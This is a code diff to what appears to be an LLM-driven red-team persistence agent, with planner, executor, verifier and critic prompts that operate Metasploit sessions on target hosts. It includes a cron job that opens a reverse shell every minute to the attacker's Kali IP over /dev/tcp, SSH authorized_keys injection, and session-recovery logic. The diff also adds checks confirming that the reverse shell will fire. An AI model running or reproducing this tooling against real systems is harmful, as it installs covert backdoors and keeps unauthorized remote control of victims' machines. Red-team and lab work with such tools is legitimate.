@@ -128,6 +128,13 @@ PRIORITIZE the RECOMMENDED TECHNIQUES provided in the context — these are pre-
 Only query the knowledge base if ALL recommended techniques have already failed or if you need
 a novel technique not in the list.
 
+**SSH KEY INJECTION PRECONDITION:** Only select SSH authorized_keys injection if the recon data,
+the KNOWN OPEN PORTS line, or the objective text confirms port 22/SSH is open on the target. The
+session may have been obtained via a NON-SSH vector (e.g., an IRC or web backdoor) on a host with
+no SSH daemon — injecting a key there silently fails and the verifier's SSH login test will burn
+all its slots. If SSH status is unknown or port 22 is NOT confirmed open, prefer the cron job as
+the first attempt.
+
 **You have access to `query_knowledge_base`** — a RAG tool for searching post-exploitation techniques.
 Use it as a FALLBACK only (max {MAX_PLANNER_TOOL_CALLS} queries). Focus queries on specific novel
 techniques, NOT generic "persistence" searches.
@@ -169,6 +176,13 @@ You have 3 tools — each runs in a DIFFERENT place:
 **CRITICAL:** To run commands on the target, ALWAYS use `tool_session_command`. This is reliable and atomic.
 Do NOT use `tool_metasploit_rpc` for target commands — it goes through the MSF console which is unreliable.
 Do NOT use `tool_linux_terminal` for target commands — that runs on Kali, not the target.
+
+**DEAD SESSION DETECTION:** If `tool_session_command` returns "Error: Session <id> not found",
+the session has died. Immediately call `tool_metasploit_rpc("sessions")` to list active sessions.
+If an active session to the target exists, switch to its ID for ALL remaining commands.
+If no active session exists at all, STOP making tool calls and state clearly in your summary that
+the session was dead — do NOT attempt any further persistence commands. Do NOT retry the original
+session_id after seeing the not-found error (retrying only burns your tool budget).
 
 - **NEVER use `sudo` through a session** — if you have root access, you already ARE root. If you don't, sudo won't work (no TTY).
 
@@ -231,6 +245,12 @@ You have 3 tools:
 - To check things FROM KALI (SSH login test, listener check), use `tool_linux_terminal`.
 - Do NOT use `tool_metasploit_rpc` for running commands on the target.
 
+**DEAD SESSION DETECTION:** If `tool_session_command` returns "Error: Session <id> not found",
+the session has died. Immediately call `tool_metasploit_rpc("sessions")` to list active sessions.
+If an active session to the target exists, switch to its ID for the remaining verification commands.
+If no active session exists at all, STOP making tool calls and report STATUS: NOT WORKING with
+EVIDENCE noting the session was dead — do NOT retry the original session_id.
+
 **Verification strategies by technique:**
 
 SSH Key:
@@ -247,9 +267,16 @@ Cron Job:
      Expected: cron daemon is running/active.
   3. ON TARGET: `tool_session_command("<session_id>", "which bash")`
      Expected: the shell binary referenced by the entry exists (e.g. /bin/bash).
+  4. ON TARGET: `tool_session_command("<session_id>", "ls -la /dev/tcp 2>/dev/null || echo no_dev_tcp")`
+     Expected: /dev/tcp exists (bash pseudo-device). If the output is
+     `no_dev_tcp`, the `/dev/tcp` redirection the reverse shell relies on is
+     unavailable on this target — the cron job is listed but the reverse shell
+     will NOT fire. In that case set STATUS to PARTIAL (not WORKING) and note
+     it in EVIDENCE so the critic knows a file-write heartbeat fallback is needed.
 - If the cron entry is a reverse shell, you cannot directly confirm it fires
-  without a listener on Kali. Treat it as WORKING only when all three checks
-  above pass: entry listed AND cron daemon active AND shell binary present.
+  without a listener on Kali. Treat it as WORKING only when all FOUR checks
+  above pass: entry listed AND cron daemon active AND shell binary present AND
+  /dev/tcp available.
 
 Systemd Service:
 - ON TARGET: `tool_session_command("<session_id>", "systemctl is-enabled <service>")`
@@ -268,8 +295,10 @@ User Account:
 
 VERIFICATION RESULT:
 METHOD: <technique verified>
-STATUS: <WORKING | NOT WORKING>
-EVIDENCE: <what output confirmed it>
+STATUS: <WORKING | PARTIAL | NOT WORKING>
+EVIDENCE: <what output confirmed it. For PARTIAL, state exactly which check
+          failed (e.g. /dev/tcp unavailable so the cron reverse shell will not
+          fire) and what fallback would make it WORKING (e.g. file-write heartbeat).>
 """
 
 CRITIC_PROMPT = f"""You are a Persistence Critic for a Red Team operation. Your IP is {KALI_IP}.
@@ -293,8 +322,11 @@ You evaluate whether a persistence mechanism was successfully installed AND veri
 3. **Both required for PASS** — installation without verification is NOT a PASS
 
 **Verdict:**
-- **PASS** if: mechanism was installed AND verified working
-- **FAIL** if: installation failed, OR verification failed or was not performed
+- **PASS** if: mechanism was installed AND verified working (verifier STATUS: WORKING)
+- **FAIL** if: installation failed, OR verification failed/not performed, OR the
+  verifier reported STATUS: PARTIAL (e.g. cron listed but /dev/tcp unavailable so
+  the reverse shell will not fire). On a PARTIAL, give FEEDBACK telling the next
+  attempt to use the file-write heartbeat fallback or a different technique.
 
 **Output format:**
 
@@ -352,6 +384,33 @@ def _sanitize_message_window(messages: list) -> list:
             i += 1
     return sanitized
 
+def _extract_open_ports(text: str) -> str:
+    """Best-effort extraction of open-port hints from recon/objective text.
+
+    Looks for explicit 'open' port mentions and bare port numbers next to
+    common service names so the planner can filter SSH-key injection when
+    port 22 is not confirmed open. Returns a short comma-joined string or "".
+    """
+    if not text:
+        return ""
+    ports = set()
+    # Patterns like "22/tcp open", "port 22", "22 (ssh)", "ssh on 22"
+    for m in re.finditer(r"(\d{1,5})\s*/\s*tcp\s+open", text, re.IGNORECASE):
+        ports.add(m.group(1))
+    for m in re.finditer(r"\bport\s+(\d{1,5})\b", text, re.IGNORECASE):
+        ports.add(m.group(1))
+    # Service-name hints map to their canonical port.
+    service_ports = {"ssh": "22", "http": "80", "https": "443", "ftp": "21", "irc": "6667"}
+    low = text.lower()
+    for svc, port in service_ports.items():
+        if svc in low:
+            ports.add(port)
+    if not ports:
+        return ""
+    # Sort numerically for readability.
+    return ", ".join(sorted(ports, key=lambda p: int(p)))
+
+
 def _get_recommended_techniques(access_level: str, session_type: str, session_id: str) -> str:
     """Return deterministic persistence technique recommendations based on context.
 
@@ -373,8 +432,13 @@ def _get_recommended_techniques(access_level: str, session_type: str, session_id
                 f'tool_session_command({session_id}, "echo \\"* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\'\\" | crontab -")',
                 f'tool_session_command({session_id}, "crontab -l")  # verify on TARGET',
             ],
-            "verification": "tool_session_command: crontab -l shows the reverse shell entry",
-            "notes": "Most reliable. Works on all Linux. Fires every minute.",
+            "verification": "tool_session_command: crontab -l shows the reverse shell entry; ls -la /dev/tcp confirms the reverse shell can fire",
+            "notes": ("Most reliable. Works on all Linux. Fires every minute. The entry "
+                      "explicitly invokes /bin/bash so /dev/tcp works even if cron uses /bin/sh. "
+                      "If /dev/tcp is unavailable (some hardened kernels/distros), the reverse "
+                      "shell will NOT fire — fall back to a file-write heartbeat to prove the "
+                      "cron executes: append "
+                      "'* * * * * /bin/sh -c \"date >> /tmp/.hb\"' and verify /tmp/.hb grows."),
         })
         techniques.append({
             "name": "SSH authorized_keys injection",
@@ -416,8 +480,12 @@ def _get_recommended_techniques(access_level: str, session_type: str, session_id
                 f'tool_session_command({session_id}, "echo \\"* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\'\\" | crontab -")',
                 f'tool_session_command({session_id}, "crontab -l")  # verify on TARGET',
             ],
-            "verification": "tool_session_command: crontab -l shows the reverse shell entry",
-            "notes": "Works without root. User-level cron.",
+            "verification": "tool_session_command: crontab -l shows the reverse shell entry; ls -la /dev/tcp confirms the reverse shell can fire",
+            "notes": ("Works without root. User-level cron. The entry explicitly invokes "
+                      "/bin/bash so /dev/tcp works even if cron uses /bin/sh. If /dev/tcp is "
+                      "unavailable, the reverse shell will NOT fire — fall back to a file-write "
+                      "heartbeat (e.g. '* * * * * /bin/sh -c \"date >> /tmp/.hb\"') to prove the "
+                      "cron executes."),
         })
         techniques.append({
             "name": "SSH authorized_keys injection (user)",
@@ -501,6 +569,22 @@ def planner_node(state: PersistenceState) -> dict:
             context += (
                 "\nACCESS LEVEL: unknown — first step: run tool_session_command to "
                 "check whoami/sudo -l before choosing technique.\n"
+            )
+
+        # Surface any open-port hints from the objective / initial recon text so
+        # the planner can filter SSH-dependent techniques when port 22 is not
+        # confirmed open. Scan the objective plus the initial HumanMessage.
+        port_source = state.get("objective", "") or ""
+        for msg in messages:
+            if isinstance(msg, HumanMessage) and msg.content:
+                port_source += "\n" + msg.content
+        known_ports = _extract_open_ports(port_source)
+        if known_ports:
+            context += f"\nKNOWN OPEN PORTS: {known_ports}\n"
+        else:
+            context += (
+                "\nKNOWN OPEN PORTS: unknown — port 22/SSH NOT confirmed open. "
+                "Prefer cron over SSH key injection unless you confirm SSH is open.\n"
             )
 
         # Inject deterministic technique recommendations
@@ -597,7 +681,12 @@ def executor_node(state: PersistenceState) -> dict:
         print_colored(f"[Persistence Executor] Tool cap ({executor_tool_count}). Forcing summary.", Colors.WARNING)
         response = call_llm(
             messages=executor_msgs + [HumanMessage(content=(
-                "Max tool calls reached. Summarize what was installed so far."
+                "Max tool calls reached. List ONLY what you VERIFIED actually succeeded "
+                "(i.e., the command returned the expected output you can see in the tool "
+                "results above). If any step failed, returned an error, or you never saw "
+                "its output, say so explicitly. Do NOT claim success for steps whose output "
+                "you did not see. Begin your summary with this exact format:\n"
+                "PARTIAL INSTALL — <what succeeded> | FAILED — <what did not>"
             ))],
             system_prompt=EXECUTOR_PROMPT
         )
@@ -905,6 +994,80 @@ def build_graph() -> StateGraph:
     return workflow
 
 # =============================================================================
+# SESSION LIVENESS
+# =============================================================================
+
+def _probe_session(target_ip: str, session_id: str, session_type: str):
+    """Check that session_id is alive before entering the graph.
+
+    Returns a tuple (live_session_id, live_session_type, status_message).
+
+    - If the requested session is alive, returns it unchanged.
+    - If it is dead, attempts to find a live substitute session on the SAME
+      target via session.list and returns the substitute.
+    - If no live session exists at all, returns (None, None, message) so the
+      caller can abort cleanly with a best-effort findings dict instead of
+      burning every executor tool slot on 'Session X not found' errors.
+    """
+    try:
+        stype = msf_session.get_session_type(session_id)
+    except Exception as e:
+        print_colored(
+            f"[Persistence Probe] session.list raised {e} — proceeding with given session.",
+            Colors.WARNING,
+        )
+        return session_id, session_type, "probe_error_proceeding"
+
+    if stype is not None:
+        if isinstance(stype, bytes):
+            stype = stype.decode("utf-8", errors="ignore")
+        resolved_type = "meterpreter" if "meterpreter" in stype else "command_shell"
+        print_colored(
+            f"[Persistence Probe] Session {session_id} is LIVE ({resolved_type}).",
+            Colors.OKGREEN,
+        )
+        # Trust caller's session_type if provided; otherwise use resolved.
+        return session_id, (session_type or resolved_type), "alive"
+
+    # Session is dead — try to find a live substitute on the same target.
+    print_colored(
+        f"[Persistence Probe] Session {session_id} is DEAD — searching for a live substitute...",
+        Colors.WARNING,
+    )
+    try:
+        sessions = msf_session.client.call("session.list") or {}
+    except Exception as e:
+        print_colored(f"[Persistence Probe] session.list failed: {e}", Colors.FAIL)
+        return None, None, f"Session {session_id} dead and session.list failed ({e})."
+
+    def _g(d, key, default=None):
+        return d.get(key.encode(), d.get(key, default))
+
+    for sid, details in sessions.items():
+        sid_str = str(sid)
+        if sid_str == str(session_id):
+            continue
+        # Match on the same target host where possible.
+        host = _g(details, "session_host", _g(details, "target_host", b""))
+        if isinstance(host, bytes):
+            host = host.decode("utf-8", errors="ignore")
+        raw_type = _g(details, "type", b"shell")
+        if isinstance(raw_type, bytes):
+            raw_type = raw_type.decode("utf-8", errors="ignore")
+        resolved_type = "meterpreter" if "meterpreter" in raw_type else "command_shell"
+        if target_ip and host and host != target_ip:
+            continue
+        print_colored(
+            f"[Persistence Probe] Substituting live session {sid_str} "
+            f"({resolved_type}, host={host or 'unknown'}).",
+            Colors.OKGREEN,
+        )
+        return sid_str, resolved_type, f"substituted_{sid_str}"
+
+    return None, None, f"Session {session_id} dead and no live session to {target_ip} found."
+
+
+# =============================================================================
 # FINDINGS EXTRACTION
 # =============================================================================
 
@@ -949,10 +1112,16 @@ def _extract_persistence_findings(state: dict) -> PersistenceFindings:
     if success:
         summary = f"Persistence established via {method}. Verified working."
     else:
-        last_output = (verification_result or install_result or "No output captured").strip()
+        # Keep install and verify context SEPARATE and at 300 chars each so the
+        # orchestrator/replanner has enough actionable detail to route around the
+        # failure (the old joined 150-char truncation dropped the verify reason).
+        install_ctx = (install_result or "none").strip()
+        verify_ctx = (verification_result or "none").strip()
         summary = (
             f"Persistence failed after {state.get('loop_step', 0)} attempt(s). "
-            f"Last method tried: {method}. {last_output[:150]}"
+            f"Method: {method}. "
+            f"Install: {install_ctx[:300]} "
+            f"Verify: {verify_ctx[:300]}"
         )
 
     return PersistenceFindings(
@@ -979,6 +1148,35 @@ def run_persistence(
 
     if thread_id is None:
         thread_id = f"persist_{uuid.uuid4().hex[:8]}"
+
+    # --- SESSION LIVENESS PROBE (before entering the graph) ---
+    # A dead session causes the executor to burn all 10 tool slots receiving
+    # "Error: Session X not found." on every command, then a guaranteed FAIL.
+    # Probe first: substitute a live session if one exists, else abort cleanly.
+    probed_id, probed_type, probe_status = _probe_session(
+        target_ip, session_id, session_type
+    )
+    if probed_id is None:
+        print_colored(
+            f"[run_persistence] {probe_status} — aborting before graph entry.",
+            Colors.FAIL,
+        )
+        return PersistenceFindings(
+            success=False,
+            method="error",
+            details=f"Session liveness probe: {probe_status}",
+            summary=(
+                f"Persistence aborted — session {session_id} not found. "
+                f"No active session to the target. ({probe_status})"
+            ),
+        )
+    if probed_id != session_id or probed_type != session_type:
+        print_colored(
+            f"[run_persistence] Using session {probed_id} ({probed_type}) "
+            f"instead of requested {session_id} ({session_type}).",
+            Colors.WARNING,
+        )
+    session_id, session_type = probed_id, probed_type
 
     workflow = build_graph()
     checkpointer = MemorySaver()
